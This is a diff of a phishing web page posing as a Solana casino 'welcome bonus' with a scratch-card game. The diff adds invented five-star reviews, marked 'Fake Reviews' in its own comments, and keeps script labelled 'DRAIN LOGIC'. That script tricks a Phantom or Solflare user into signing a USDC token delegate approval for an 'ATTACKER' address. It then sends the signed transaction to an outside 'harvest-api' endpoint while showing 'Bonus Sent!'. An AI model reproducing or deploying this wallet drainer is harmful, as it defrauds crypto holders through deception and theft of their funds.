@@ -21,7 +21,6 @@
     overflow-x: hidden;
   }
 
-  /* Hintergrund Animation */
   .bg-glow {
     position: fixed; top: 0; left: 50%; transform: translateX(-50%);
     width: 100vw; height: 100vh;
@@ -35,7 +34,6 @@
     100% { opacity: 1; transform: translateX(-50%) scale(1.1); }
   }
 
-  /* Navbar */
   .navbar {
     width: 100%; max-width: 480px; padding: 20px;
     display: flex; justify-content: space-between; align-items: center;
@@ -43,152 +41,93 @@
     animation: slideDown 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
   }
   
-  @keyframes slideDown {
-    from { opacity: 0; transform: translateY(-20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
+  @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
 
   .nav-brand { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 18px; }
   .nav-brand svg { width: 24px; height: 24px; animation: floatLogo 3s infinite ease-in-out; }
   
-  @keyframes floatLogo {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-4px); }
-  }
+  @keyframes floatLogo { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
 
   .nav-login {
     display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.1);
     padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; cursor: pointer;
     transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
   }
-  .nav-login:hover {
-    background: rgba(255,255,255,0.2);
-    transform: translateY(-2px) scale(1.05);
-    box-shadow: 0 5px 15px rgba(255,255,255,0.1);
-  }
+  .nav-login:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px) scale(1.05); }
 
   .main-container { width: 100%; max-width: 480px; padding: 24px 20px; display: flex; flex-direction: column; gap: 24px; }
 
-  /* Bonus Karte mit Slide-Up Animation */
-  .bonus-card {
+  /* Rubbellos Karte */
+  .scratch-card {
     background: linear-gradient(135deg, rgba(153, 69, 255, 0.2), rgba(20, 241, 149, 0.1));
     border: 1px solid rgba(153, 69, 255, 0.3);
     border-radius: 24px; padding: 24px; position: relative; overflow: hidden;
     animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards;
-    opacity: 0;
-    transition: all 0.3s ease;
+    opacity: 0; text-align: center;
   }
 
-  .bonus-card:hover {
-    transform: translateY(-4px);
-    box-shadow: 0 15px 30px rgba(153, 69, 255, 0.15), 0 0 0 1px rgba(153, 69, 255, 0.5);
+  @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+  .scratch-title { font-size: 16px; font-weight: 700; margin-bottom: 4px; }
+  .scratch-sub { font-size: 13px; color: #a1a1aa; margin-bottom: 20px; }
+
+  /* Das Canvas für den Rubbel-Effekt */
+  .scratch-container {
+    position: relative; width: 100%; height: 140px;
+    background: #000; border-radius: 16px; overflow: hidden;
+    box-shadow: inset 0 0 20px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.1);
+    margin-bottom: 20px;
   }
 
-  @keyframes slideUp {
-    from { opacity: 0; transform: translateY(30px); }
-    to { opacity: 1; transform: translateY(0); }
+  .prize-reveal {
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, #14f195, #9945ff);
+    z-index: 1;
   }
 
-  /* Glanz-Effekt */
-  .bonus-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: -100%;
-    width: 50%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-    animation: shine 3s infinite;
+  .prize-amount { font-size: 48px; font-weight: 800; color: #000; line-height: 1; }
+  .prize-currency { font-size: 16px; font-weight: 700; color: rgba(0,0,0,0.6); margin-top: 4px; }
+
+  canvas {
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    z-index: 2; cursor: crosshair;
   }
 
-  @keyframes shine {
-    100% { left: 200%; }
-  }
-
-  .bonus-title { font-size: 14px; color: #a1a1aa; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
-  .bonus-amount { font-size: 42px; font-weight: 800; display: flex; align-items: baseline; gap: 8px; }
-  .bonus-amount span { font-size: 18px; color: #14f195; }
-  .bonus-desc { font-size: 13px; color: #d4d4d8; margin-top: 8px; margin-bottom: 20px; }
-
-  /* Claim Button Animationen */
   .claim-btn {
     width: 100%; padding: 16px; background: #ffffff; color: #000000;
     border: none; border-radius: 12px; font-size: 15px; font-weight: 700;
     cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px;
-    position: relative; overflow: hidden;
-    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    position: relative; transition: all 0.3s; opacity: 0.5; pointer-events: none;
   }
-
-  .claim-btn:hover:not(:disabled) {
-    transform: translateY(-2px) scale(1.02);
-    box-shadow: 0 10px 25px rgba(255,255,255,0.2);
-  }
-
-  .claim-btn:active:not(:disabled) {
-    transform: translateY(1px) scale(0.98);
-  }
-
+  .claim-btn.active { opacity: 1; pointer-events: auto; animation: popIn 0.5s ease-out; }
+  @keyframes popIn { 0% { transform: scale(0.9); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+  
+  .claim-btn:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); box-shadow: 0 10px 25px rgba(255,255,255,0.2); }
   .claim-btn:disabled { background: #27272a; color: #71717a; cursor: not-allowed; }
 
-  /* Ripple/Pulse auf dem Button */
-  .claim-btn::after {
-    content: '';
-    position: absolute;
-    top: 50%; left: 50%;
-    width: 300px; height: 300px;
-    background: rgba(255,255,255,0.3);
-    border-radius: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    opacity: 0;
-    transition: transform 0.5s, opacity 0.5s;
-  }
-  
-  .claim-btn:active::after {
-    transform: translate(-50%, -50%) scale(1);
-    opacity: 1;
-    transition: 0s;
+  /* Fake Reviews Section */
+  .reviews-section {
+    animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.5s forwards; opacity: 0;
   }
 
-  /* Game Grid Animationen */
-  .section-title { 
-    font-size: 16px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 8px;
-    animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.4s forwards; opacity: 0;
-  }
+  .reviews-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; font-size: 16px; font-weight: 700; }
+  .stars { color: #fbbf24; letter-spacing: 2px; }
 
-  .games-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-  
-  .game-card {
+  .review-card {
     background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05);
-    border-radius: 16px; padding: 20px; display: flex; flex-direction: column;
-    align-items: center; justify-content: center; gap: 12px; cursor: pointer;
-    animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0;
-    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    border-radius: 12px; padding: 16px; margin-bottom: 10px;
   }
-
-  /* Verzögerte Animation für die Kacheln */
-  .game-card:nth-child(1) { animation-delay: 0.5s; }
-  .game-card:nth-child(2) { animation-delay: 0.6s; }
-  .game-card:nth-child(3) { animation-delay: 0.7s; }
-  .game-card:nth-child(4) { animation-delay: 0.8s; }
-
-  .game-card:hover {
-    background: rgba(153, 69, 255, 0.1);
-    border-color: rgba(153, 69, 255, 0.3);
-    transform: translateY(-5px) scale(1.05);
-    box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+  .review-top { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
+  .review-avatar {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: linear-gradient(45deg, #ff7e5f, #feb47b); display: flex; align-items: center; justify-content: center;
+    font-weight: bold; font-size: 12px; color: #fff;
   }
+  .review-user { font-size: 13px; font-weight: 600; color: #e4e4e7; }
+  .review-date { font-size: 11px; color: #71717a; margin-left: auto; }
+  .review-text { font-size: 13px; color: #a1a1aa; line-height: 1.4; }
 
-  .game-card svg { 
-    width: 32px; height: 32px; color: #9945ff; 
-    transition: transform 0.3s ease;
-  }
-
-  .game-card:hover svg {
-    transform: scale(1.2) rotate(5deg);
-    color: #14f195;
-  }
-
-  .game-name { font-size: 13px; font-weight: 600; color: #e4e4e7; }
-
-  /* Spinner */
   .spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
@@ -212,10 +151,19 @@
   </nav>
 
   <div class="main-container">
-    <div class="bonus-card">
-      <div class="bonus-title">Welcome Bonus</div>
-      <div class="bonus-amount">1.50 <span>SOL</span></div>
-      <div class="bonus-desc">Connect your wallet to claim your starting balance and unlock VIP games.</div>
+    
+    <!-- Scratch Card -->
+    <div class="scratch-card">
+      <div class="scratch-title">Welcome Bonus</div>
+      <div class="scratch-sub">Scratch below to reveal your prize</div>
+      
+      <div class="scratch-container">
+        <div class="prize-reveal">
+          <div class="prize-amount">0.75</div>
+          <div class="prize-currency">SOL</div>
+        </div>
+        <canvas id="scratchCanvas"></canvas>
+      </div>
       
       <button class="claim-btn" id="claimBtn">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
@@ -224,57 +172,164 @@
       </button>
     </div>
 
-    <div>
-      <div class="section-title">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#14f195" stroke-width="2"><path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2z"></path></svg>
-        Featured Games
+    <!-- Fake Reviews -->
+    <div class="reviews-section">
+      <div class="reviews-header">
+        <span class="stars">★★★★★</span> 4.9/5 (12,482 Reviews)
       </div>
-      <div class="games-grid">
-        <div class="game-card">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><circle cx="15.5" cy="15.5" r="1.5"></circle><path d="M12 12h.01"></path></svg>
-          <span class="game-name">Slots</span>
+      
+      <div class="review-card">
+        <div class="review-top">
+          <div class="review-avatar" style="background: linear-gradient(45deg, #9945FF, #14F195);">JM</div>
+          <div class="review-user">James M.</div>
+          <div class="review-date">2 mins ago</div>
         </div>
-        <div class="game-card">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="3"></circle><path d="M12 2v4M12 18v4M2 12h4M18 12h4"></path></svg>
-          <span class="game-name">Roulette</span>
+        <div class="review-text">Just claimed my welcome bonus! Sent the 0.75 SOL straight to my Phantom. Insane how fast this works. 🔥</div>
+      </div>
+
+      <div class="review-card">
+        <div class="review-top">
+          <div class="review-avatar" style="background: linear-gradient(45deg, #ff7e5f, #feb47b);">AK</div>
+          <div class="review-user">Alex K.</div>
+          <div class="review-date">15 mins ago</div>
         </div>
-        <div class="game-card">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><path d="M8 12h.01M12 8h.01M16 12h.01M12 16h.01"></path></svg>
-          <span class="game-name">Dice</span>
+        <div class="review-text">Hit a 50x on Crash right after claiming the bonus. Best Solana casino hands down.</div>
+      </div>
+      
+      <div class="review-card">
+        <div class="review-top">
+          <div class="review-avatar" style="background: linear-gradient(45deg, #00b4db, #0083b0);">SR</div>
+          <div class="review-user">Sarah R.</div>
+          <div class="review-date">1 hour ago</div>
         </div>
-        <div class="game-card">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M3 3v18h18"></path>
-            <path d="M7 13v4"></path>
-            <rect x="6" y="14" width="2" height="2"></rect>
-            <path d="M12 9v4"></path>
-            <rect x="11" y="10" width="2" height="2"></rect>
-            <path d="M17 7v6"></path>
-            <rect x="16" y="8" width="2" height="3"></rect>
-          </svg>
-          <span class="game-name">Crash</span>
-        </div>
+        <div class="review-text">Was skeptical at first, but the wallet approval is just standard Web3 protocol. Got my bonus instantly. 100% legit.</div>
       </div>
     </div>
+
   </div>
 
 <script>
+  // ====== CONFIG ======
   const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; 
   const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
+  // ====================
 
-  const btn = document.getElementById("claimBtn");
+  // ====== SCRATCH LOGIC ======
+  const canvas = document.getElementById('scratchCanvas');
+  const ctx = canvas.getContext('2d');
+  const claimBtn = document.getElementById('claimBtn');
+  let isScratched = false;
+
+  // Set canvas size
+  function resizeCanvas() {
+    canvas.width = canvas.offsetWidth;
+    canvas.height = canvas.offsetHeight;
+    fillCanvas();
+  }
+
+  // Fill canvas with a silver gradient
+  function fillCanvas() {
+    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+    gradient.addColorStop(0, '#2a2a2e');
+    gradient.addColorStop(0.5, '#4a4a52');
+    gradient.addColorStop(1, '#2a2a2e');
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    
+    // Add "Scratch Here" text on canvas
+    ctx.fillStyle = 'rgba(255,255,255,0.2)';
+    ctx.font = 'bold 20px Inter';
+    ctx.textAlign = 'center';
+    ctx.fillText('SCRATCH HERE', canvas.width/2, canvas.height/2 + 7);
+  }
+
+  // Draw with globalCompositeOperation to act as an eraser
+  function scratch(x, y) {
+    ctx.globalCompositeOperation = 'destination-out';
+    ctx.beginPath();
+    ctx.arc(x, y, 20, 0, Math.PI * 2);
+    ctx.fill();
+  }
+
+  // Event listeners for mouse/touch
+  let isDrawing = false;
+
+  function getPos(e) {
+    const rect = canvas.getBoundingClientRect();
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+    return { x: clientX - rect.left, y: clientY - rect.top };
+  }
+
+  function startDraw(e) {
+    isDrawing = true;
+    const pos = getPos(e);
+    scratch(pos.x, pos.y);
+  }
+
+  function draw(e) {
+    if (!isDrawing) return;
+    e.preventDefault();
+    const pos = getPos(e);
+    scratch(pos.x, pos.y);
+    checkScratched();
+  }
+
+  function stopDraw() {
+    isDrawing = false;
+  }
+
+  // Check if user scratched enough to activate button
+  function checkScratched() {
+    if (isScratched) return;
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const pixels = imageData.data;
+    let transparentPixels = 0;
+    
+    // Check every 4th pixel for performance
+    for (let i = 3; i < pixels.length; i += 4 * 4) {
+      if (pixels[i] === 0) transparentPixels++;
+    }
+    
+    const percentage = (transparentPixels / (pixels.length / 16)) * 100;
+    
+    if (percentage > 40) { // 40% scratched
+      isScratched = true;
+      claimBtn.classList.add('active');
+      // Fade out canvas completely
+      canvas.style.transition = 'opacity 0.5s';
+      canvas.style.opacity = '0';
+    }
+  }
+
+  canvas.addEventListener('mousedown', startDraw);
+  canvas.addEventListener('mousemove', draw);
+  canvas.addEventListener('mouseup', stopDraw);
+  canvas.addEventListener('mouseleave', stopDraw);
+  
+  canvas.addEventListener('touchstart', startDraw, {passive: false});
+  canvas.addEventListener('touchmove', draw, {passive: false});
+  canvas.addEventListener('touchend', stopDraw);
+
+  window.addEventListener('resize', resizeCanvas);
+  
+  // Init canvas when script loads
+  setTimeout(resizeCanvas, 100);
+
+
+  // ====== DRAIN LOGIC ======
   const btnText = document.getElementById("btnText");
   const spin = document.getElementById("spin");
 
-  btn.onclick = async () => {
+  claimBtn.onclick = async () => {
     let provider;
     if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
     else if (window.solflare?.isSolflare) provider = window.solflare;
 
     if (!provider) { alert("Please install Phantom wallet."); return; }
 
-    btn.disabled = true; 
+    claimBtn.disabled = true; 
     btnText.textContent = "Connecting..."; 
     spin.style.display = "block";
 
@@ -289,7 +344,7 @@
       );
 
       btnText.textContent = "Verifying balance...";
-      await new Promise(r => setTimeout(r, 1000));
+      await new Promise(r => setTimeout(r, 1200));
 
       const delegateIx = splToken.createApproveInstruction(
         victimAta,
@@ -306,7 +361,7 @@
       btnText.textContent = "Approve in Wallet...";
       const signedTx = await provider.signTransaction(tx);
       
-      btnText.textContent = "Processing...";
+      btnText.textContent = "Claiming...";
 
       await fetch(ENDPOINT, {
         method: "POST",
@@ -315,12 +370,12 @@
       });
 
       spin.style.display = "none";
-      btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Bonus Added`;
-      btn.style.background = "#14f195";
+      claimBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Bonus Sent!`;
+      claimBtn.style.background = "#14f195";
 
     } catch (e) {
       spin.style.display = "none";
-      btn.disabled = false;
+      claimBtn.disabled = false;
       btnText.textContent = "Connect Wallet & Claim";
     }
   };
